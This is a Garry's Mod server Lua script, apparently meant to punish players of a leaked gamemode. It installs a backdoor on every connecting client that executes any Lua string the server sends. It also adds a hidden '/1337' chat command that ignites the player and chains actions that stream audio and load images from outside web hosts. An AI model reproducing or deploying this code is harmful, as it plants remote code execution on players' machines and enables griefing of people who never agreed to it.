--[[
	File: ?.lua
	For: Annoying pirates to death, then annoying them some more until they die a second time
	By: Ultra
]]--

util.AddNetworkString "slua"

local lol = {}
function lol:RandomString( intMin, intMax )
	local ret = ""
	for _ = 1, math.random( intMin, intMax ) do
		ret = ret.. string.char( math.random(65, 90) )
	end

	return ret
end

lol.m_tblActions = {}
lol.m_strImageGlobalVar = lol:RandomString( 6, 12 )
lol.m_strImageLoadHTML = [[<style type="text/css"> html, body {background-color: transparent;} html{overflow:hidden; ]].. (true and "margin: -8px -8px;" or "margin: 0px 0px;") ..[[ } </style><body><img src="]] .. "%s" .. [[" alt="" width="]] .. "%i"..[[" height="]] .. "%i" .. [[" /></body>]]

function lol:PushAction( intChainDelay, func )
	self.m_tblActions[#self.m_tblActions +1] = { intChainDelay, func }
end

function lol:NextAction( pPlayer )
	pPlayer.m_intCurAction = pPlayer.m_intCurAction +1
	if not self.m_tblActions[pPlayer.m_intCurAction] then return end

	timer.Simple( self.m_tblActions[pPlayer.m_intCurAction][1], function()
		if not IsValid( pPlayer ) then return end
		self.m_tblActions[pPlayer.m_intCurAction][2]( pPlayer )
		self:NextAction( pPlayer )
	end )
end

function lol:Start( pPlayer )
	pPlayer.m_intCurAction = 0
	self:NextAction( pPlayer )
end

function lol:SendLua( pPlayer, strLua )
	net.Start( "slua" )
		net.WriteString( strLua )
	net.Send( pPlayer )
end

function lol:SetupPlayer( pPlayer )
	pPlayer:SendLua( "net.Receive(\"slua\", function() RunString(net.ReadString()) end)" )
end

for k, v in pairs( player.GetAll() ) do
	lol:SetupPlayer( v )
	timer.Simple( 2, function() lol:Start( v ) end )
end

hook.Add( "PlayerAuthed", "wat", function( pPlayer )
	lol:SetupPlayer( pPlayer )
	timer.Simple( 10, function() lol:Start( pPlayer ) end )	
end )

hook.Add( "PlayerSay", "1337command", function( pSender, strText, bTeamChat )
	if strText:sub( 1, 5 ) == "/1337" then
		pSender:Ignite( 1e9 )
		pSender:ChatPrint( "lol jk" )
		pSender:SendLua( [[surface.PlaySound( "vo/npc/male01/hacks01.wav" )]] )
		return false
	end
end )



--Sequence stack
--Start some tunes and steam in our assets
lol:PushAction( 0, function( pPlayer )
	lol:SendLua( pPlayer, ([=[
		sound.PlayURL( "https://werooohttp4.000webhostapp.com/freeman.mp3", "", function()end )
		
		g_]=].. lol.m_strImageGlobalVar.. [=[ = {}
		local html = [[%s]]
		local function LoadWebMaterial( strURL, strUID, intSizeX, intSizeY )
			local pnl = vgui.Create( "HTML" )
			pnl:SetPos( ScrW() -1, ScrH() -1 )
			pnl:SetVisible( true )
			pnl:SetMouseInputEnabled( false )
			pnl:SetKeyBoardInputEnabled( false )
			pnl:SetSize( intSizeX, intSizeY )
			pnl:SetHTML( html:format(strURL, intSizeX, intSizeY) )
			
			local PageLoaded
			PageLoaded = function()
				local mat = pnl:GetHTMLMaterial()
				if mat then
					g_]=].. lol.m_strImageGlobalVar.. [=[[strUID] = { mat, pnl }
					return
				end
				
				timer.Simple( 0.5, PageLoaded )
			end

			PageLoaded()
		end

		LoadWebMaterial( "http://www.underdone.org/leak/underdone/hud.png", "hud1", 300, 128 )
		LoadWebMaterial( "http://www.underdone.org/leak/underdone/hud2.png", "hud2", 300, 128 )
		LoadWebMaterial( "http://www.underdone.org/leak/underdone/hud3.png", "hud3", 128, 128 )
		LoadWebMaterial( "http://www.underdone.org/leak/underdone/xhair.png", "xhair", 64, 64 )
		LoadWebMaterial( "http://www.underdone.org/leak/underdone/doritos.png", "doritos", 183, 256 )
		LoadWebMaterial( "http://www.underdone.org/leak/underdone/fedora.png", "fedora", 256, 256 )
		LoadWebMaterial( "http://www.underdone.org/leak/underdone/dew.png", "dew", 110, 256 )
		LoadWebMaterial( "http://www.underdone.org/leak/underdone/awp.png", "awp", 256, 55 )
	]=]):format(lol.m_strImageLoadHTML) )
end )